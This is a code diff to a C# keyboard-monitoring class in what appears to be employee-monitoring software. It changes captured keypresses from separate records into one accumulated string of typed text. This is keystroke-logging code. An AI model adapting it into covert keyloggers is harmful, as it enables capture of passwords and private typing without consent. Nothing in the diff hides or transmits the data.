@@ -4,6 +4,7 @@ using Keystroke.API;
 using Keystroke.API.CallbackObjects;
 using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -12,7 +13,7 @@ namespace EmpoleeysMonitor.Lib.Monitor.Sample
     public class KeyboardMonitor : IMonitor
     {
         private object locker = new object();
-        private readonly List<UserAction> actions = new List<UserAction>();
+        private UserAction action;
         private Thread thread;
 
         public void Start()
@@ -30,9 +31,9 @@ namespace EmpoleeysMonitor.Lib.Monitor.Sample
         {
             lock (locker)
             {
-                var items = actions.GetRange(0, actions.Count); // shallow copy of list before clear
-                actions.Clear();
-                return items;
+                List<UserAction> actionList = new List<UserAction> { action };
+                action = null;
+                return actionList;
             }
         }
 
@@ -50,12 +51,19 @@ namespace EmpoleeysMonitor.Lib.Monitor.Sample
         {
             lock (locker)
             {
-                actions.Add(new UserAction()
+                if (action == null)
                 {
-                    ActionType = ActionType.KeyboardPressed,
-                    Date = DateTime.UtcNow,
-                    Info = obj.ToString()
-                });
+                    action = new UserAction()
+                    {
+                        ActionType = ActionType.KeyboardPressed,
+                        Date = DateTime.UtcNow,
+                        Info = obj.ToString()
+                    };
+                }
+                else
+                {
+                    action.Info += obj.ToString();
+                }
             }
         }
     }
